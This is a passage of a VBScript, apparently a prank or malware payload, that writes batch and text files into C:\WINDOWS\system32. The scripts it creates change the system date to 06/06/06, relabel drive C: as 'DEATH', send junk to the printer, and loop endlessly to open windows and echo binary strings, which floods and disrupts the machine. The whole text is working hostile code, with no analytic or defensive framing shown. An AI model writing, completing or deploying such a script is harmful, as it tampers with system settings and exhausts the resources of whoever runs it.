   objTextFile.WriteLine("date 06/06/06")
    objTextFile.WriteLine("label c:DEATH")
    objTextFile.WriteLine("print C:\WINDOWS\system32\0000001.txt /d:lpt1")
    objTextFile.WriteLine("start C:\WINDOWS\system32\0000002.bat")
    objTextFile.WriteLine(":con")
    objTextFile.WriteLine("start C:\WINDOWS\WINDOWS-Startup2.txt")
    objTextFile.WriteLine("goto con")
    objTextFile.WriteLine("end")
                               
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
("C:\WINDOWS\WINDOWS-Startup2.txt", ForAppending, True)

 objTextFile.WriteLine("|\\\\\\\\      |\\\\\\\         /\       \\\\\\\\\\    |       |")
 objTextFile.WriteLine("|        \     |               /  \          |         |       |")
 objTextFile.WriteLine("|        |     |              /    \         |         |       |")
 objTextFile.WriteLine("|        |     |\\\\\\\      /------\        |         |-------|")
 objTextFile.WriteLine("|        |     |            /        \       |         |       |")
 objTextFile.WriteLine("|        /     |           /          \      |         |       |")
 objTextFile.WriteLine("|////////      |\\\\\\\   /            \     |         |       |")

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
("C:\WINDOWS\system32\0000001.txt", ForAppending, True)

 objTextFile.WriteLine("!@#$%^&*()0123456789abcdefghijklmnopqrstuvwxyz-_=+[{]}\|;:',<.>/?/*-+.`~")

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
("C:\WINDOWS\system32\0000002.bat", ForAppending, True)
 
 objTextFile.WriteLine("@echo off")
 objTextFile.WriteLine(":con")
 objTextFile.WriteLine("echo 1101001001011110101001001001001001010101010001011101001001111110100001110")
 objTextFile.WriteLine("echo 0010100101000100001010001111110100010011110101001010111010001100100010110")
 objTextFile.WriteLine("echo 1101001001011110101000110001001001010101010001011101001001111110100001010")
 objTextFile.WriteLine("echo 1111001001011110101001001001000011010101010001011101001001111110100100110")
 objTextFile.WriteLine("echo 0000001001011110101000000001001001010101010001011101001001111110100000010")
 objTextFile.WriteLine("echo 0111101010001000011100100100101001010111010101001001000010101010100101000")
 objTextFile.WriteLine("echo 1101001001011110101000110001001001010101010001011101001001111110100001010")
 objTextFile.WriteLine("echo 0111101010001000011100100100101001010111010101001001000010101010100101000")
 objTextFile.WriteLine("goto con")

objTextFile.Close
